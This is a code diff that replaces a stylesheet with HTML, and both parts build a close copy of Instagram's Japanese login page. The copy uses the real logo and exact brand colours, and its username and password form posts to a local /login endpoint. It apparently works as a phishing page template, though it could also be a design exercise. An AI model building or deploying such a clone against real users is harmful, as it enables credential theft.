@@ -1,228 +1,50 @@
-/* ==========================================================================
-   1. リセット & 本家グローバルフォント平滑化
-   ========================================================================== */
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
 
-body {
-  /* 本家で採用されている、液晶画面で最も文字が美しく見えるフォント設定 */
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-  background-color: rgb(250, 250, 250); /* 本家背景色のRGB実数値 */
-  color: rgb(38, 38, 38);
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-}
+  <div class="container">
+    <main class="login-box">
+      <div class="logo-img"></div>
 
-.container {
-  width: 100%;
-  max-width: 350px;
-  display: flex;
-  flex-direction: column;
-  gap: 10px; /* 本家のカード間のマージン */
-}
+      <form class="login-form" action="/login" method="POST">
+        <div class="input-field">
+          <input type="text" name="username" id="username" autocomplete="username" required placeholder=" ">
+          <span class="placeholder-text">電話番号、ユーザーネーム、メールアドレス</span>
+        </div>
+        
+        <div class="input-field">
+          <input type="password" name="password" id="password" autocomplete="current-password" required placeholder=" ">
+          <span class="placeholder-text">パスワード</span>
+        </div>
+        
+        <button type="submit" class="submit-btn">ログイン</button>
+      </form>
 
-/* ==========================================================================
-   2. メインのログイン枠 & 本物SVGロゴ表示
-   ========================================================================== */
-.login-box {
-  background-color: rgb(255, 255, 255);
-  border: 1px solid rgb(219, 219, 219); /* 本家の薄グレー境界線 */
-  border-radius: 1px;
-  padding: 44px 40px 20px 40px; /* 上部ロゴの空気感を出すための精密な余白 */
-  text-align: center;
-}
+      <div class="separator">
+        <span class="line"></span>
+        <span class="or">または</span>
+        <span class="line"></span>
+      </div>
 
-/* 本物のInstagramロゴ（公式のスプライトWeb用アセット） */
-.logo-img {
-  height: 51px;
-  width: 175px;
-  margin: 22px auto 34px auto;
-  background-image: url('https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a6b93ad40e6.png');
-  background-size: contain;
-  background-repeat: no-repeat;
-  background-position: center;
-}
+      <div class="other-links">
+        <button type="button" class="fb-login-btn">
+          <i class="fab fa-facebook-square"></i> Facebookでログイン
+        </button>
+        <a href="#" class="forgot-password">パスワードを忘れた場合</a>
+      </div>
+    </main>
 
-/* ==========================================================================
-   3. 入力フィールド & フローティングラベル（完全解析版）
-   ========================================================================== */
-.login-form {
-  display: flex;
-  flex-direction: column;
-  gap: 6px; /* 本家仕様のタイトな詰まり感 */
-}
+    <footer class="signup-box">
+      <p>アカウントをお持ちでないですか？ <a href="#">登録する</a></p>
+    </footer>
+  </div>
 
-.input-field {
-  position: relative;
-  width: 100%;
-  height: 38px; /* 本家の正確な縦幅 */
-}
-
-.input-field input {
-  width: 100%;
-  height: 100%;
-  /* 文字が入力された際、下に少し押し下げるパディング（上部に14px空ける） */
-  padding: 14px 0 2px 8px;
-  background-color: rgb(250, 250, 250);
-  border: 1px solid rgb(219, 219, 219);
-  border-radius: 3px;
-  font-size: 12px;
-  color: rgb(38, 38, 38);
-  outline: none;
-  text-overflow: ellipsis;
-  transition: border-color 0.1s ease, background-color 0.1s ease;
-}
-
-/* フォーカス時に背景を真っ白にし、境界線を一段階暗くする公式の挙動 */
-.input-field input:focus {
-  border-color: rgb(168, 168, 168);
-  background-color: rgb(255, 255, 255);
-}
-
-/* 擬似プレースホルダーテキストの初期配置 */
-.input-field .placeholder-text {
-  position: absolute;
-  left: 8px;
-  top: 50%;
-  transform: translateY(-50%);
-  color: rgb(142, 142, 142);
-  font-size: 12px;
-  pointer-events: none;
-  transition: transform 0.1s ease, font-size 0.1s ease, top 0.1s ease;
-  transform-origin: left top;
-  /* 文字が長すぎるときに自動で三点リーダー化 */
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  width: calc(100% - 16px);
-  text-align: left;
-}
-
-/* 【本家解析】フォーカス時、または文字が入力されている時にラベルを上部（12px）へスライド縮小 */
-.input-field input:focus ~ .placeholder-text,
-.input-field input:not(:placeholder-shown) ~ .placeholder-text {
-  top: 12px;
-  font-size: 10px;
-  transform: translateY(-50%) scale(0.95); /* 本家の絶妙な縮小率 */
-}
-
-/* ==========================================================================
-   4. ログインボタン (ソリッド感の完全再現)
-   ========================================================================== */
-.submit-btn {
-  width: 100%;
-  background-color: rgb(0, 149, 246); /* 本家のプライマリブルー */
-  color: rgb(255, 255, 255);
-  border: none;
-  border-radius: 8px; /* 現行UIのモダンな角丸 */
-  height: 32px;       /* 32pxに固定することで野暮ったさが完全に消えます */
-  font-size: 14px;
-  font-weight: 600;   /* 本家の正確なフォント太さ */
-  cursor: pointer;
-  margin-top: 8px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  transition: background-color 0.1s ease;
-}
-
-/* 本家のホバー時カラーコード */
-.submit-btn:hover {
-  background-color: rgb(24, 119, 242);
-}
-
-/* クリック時のわずかな沈み込み不透明度 */
-.submit-btn:active {
-  opacity: 0.85;
-}
-
-/* ==========================================================================
-   5. セパレーター & 外部リンク
-   ========================================================================== */
-.separator {
-  display: flex;
-  align-items: center;
-  margin: 22px 0 24px 0;
-}
-
-.separator .line {
-  flex: 1;
-  height: 1px;
-  background-color: rgb(219, 219, 219);
-}
-
-.separator .or {
-  color: rgb(142, 142, 142);
-  font-size: 12px;
-  font-weight: 600;
-  padding: 0 18px;
-  letter-spacing: .5px;
-}
-
-.other-links {
-  display: flex;
-  flex-direction: column;
-  gap: 20px;
-  align-items: center;
-}
-
-.fb-login-btn {
-  background: none;
-  border: none;
-  color: rgb(56, 81, 133); /* Facebookの公式ブランドカラー */
-  font-size: 14px;
-  font-weight: 600;
-  cursor: pointer;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-
-.fb-login-btn i {
-  font-size: 16px;
-  margin-right: 8px;
-}
-
-.forgot-password {
-  color: rgb(0, 55, 107); /* 本家のリンクネイビー */
-  font-size: 12px;
-  text-decoration: none;
-  letter-spacing: -0.1px;
-}
-
-/* ==========================================================================
-   6. 下部登録ボックス & モバイルでのフラット化
-   ========================================================================== */
-.signup-box {
-  background-color: rgb(255, 255, 255);
-  border: 1px solid rgb(219, 219, 219);
-  border-radius: 1px;
-  padding: 21px;
-  text-align: center;
-  font-size: 14px;
-}
-
-.signup-box a {
-  color: rgb(0, 149, 246);
-  text-decoration: none;
-  font-weight: 600;
-}
-
-/* スマホ表示の時は外枠を完全に消去し、背景を透過させて公式アプリと同じ挙動にする */
-@media (max-width: 450px) {
-  body {
-    background-color: rgb(255, 255, 255);
-  }
-  .login-box, .signup-box {
-    border: none;
-    background-color: transparent;
-    padding: 20px;
-  }
-}
+</body>
+</html>
